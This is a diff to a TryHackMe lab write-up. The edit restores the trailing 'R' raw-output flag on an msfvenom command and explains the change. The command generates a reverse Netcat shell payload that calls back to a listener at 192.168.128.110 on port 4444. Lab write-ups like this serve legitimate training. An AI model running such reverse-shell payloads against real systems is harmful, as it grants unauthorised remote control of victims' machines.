@@ -289,10 +289,10 @@ listening on [any] 4444 ...
 
 ### Generating the Payload with msfvenom
 
-I used msfvenom to generate a reverse Netcat command pointing back to my listener address `192.168.128.110` on port `4444`. The command below removes an accidental trailing `R` typo from the original terminal input:
+I used msfvenom to generate a reverse Netcat command pointing back to my listener address `192.168.128.110` on port `4444`. The command below follows the TryHackMe Network Services instructions. The trailing `R` requests raw payload output, and it was part of the command I used in the lab:
 
 ```bash
-msfvenom -p cmd/unix/reverse_netcat lhost=192.168.128.110 lport=4444
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.128.110 lport=4444 R
 ```
 
 ```text
